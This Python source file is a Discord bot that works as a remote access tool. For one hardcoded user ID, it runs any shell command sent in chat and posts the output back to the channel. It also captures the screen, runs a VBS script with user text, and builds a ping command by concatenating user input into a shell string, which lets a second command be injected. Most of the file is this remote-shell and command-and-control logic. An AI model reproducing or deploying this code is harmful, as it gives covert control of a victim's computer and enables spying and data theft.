import discord, asyncio, subprocess, os, pyautogui
from datetime import datetime
from random import randint
from hashlib import sha512

bot = discord.Client()

master = 'dV00-$@conn'

def check(m):
	return m == '344031555544547328' # CHANGE ID TO YOUR DISCORD ID

@bot.event
async def on_message(message):
	if check(message.author.id):
		if message.content.startswith('^'):
			print(' -[OUTPUT]')
			try:
				await bot.send_message(message.channel, 'Output:```'+ subprocess.check_output(message.content.split('^')[1].split(' '), shell=True).decode('utf-8') +'```')
			except:
				await bot.send_message(message.channel, 'Output:```CANT OUTPUT```')
		elif message.content.startswith('MSG '):
			print(' -[MSG]')
			os.system('cscript test.vbs "'+ message.content.split('MSG ')[1] +'"')
			await bot.send_message(message.channel, '```The MSG Sended```')
		elif message.content.startswith('SCREEN'):
			print(' -[SCREEN]')
			pyautogui.screenshot('screenshots/screen.png')
		elif message.content.startswith('*'):
			print(' -[EXECUTE]')
			os.system(message.content.split('*')[1])
			try:
				await bot.send_message(message.channel, 'Output:```"'+ message.content.split('*')[1] +'" Executed.```')
			except:
				await bot.send_message(message.channel, 'Output:```CANT EXECUTE```')
		elif message.content.startswith('GETIMG'):
			print(' -[IMG]')
			await bot.send_message(message.channel, 'https://www.google.com/search?q='+ message.content.split('GETIMG ')[1].replace(' ', '+') +'&source=lnms&tbm=isch')
		elif message.content.startswith('YTB'):
			print(' -[YOUTUBE URL]')
			await bot.send_message(message.channel, 'https://www.youtube.com/results?search_query='+ message.content.split('YTB ')[1].replace(' ', '+'))
		elif message.content.startswith('CMX'):
			exit()
		elif message.content.startswith('$ms'):
			print(' -[MS]')
			await bot.send_message(message.channel, 'Output:```'+ subprocess.check_output('ping ' + message.content.split('$ms ')[1], shell=True).decode('utf-8') +'```')

bot.run('token') # TOKEN HERE
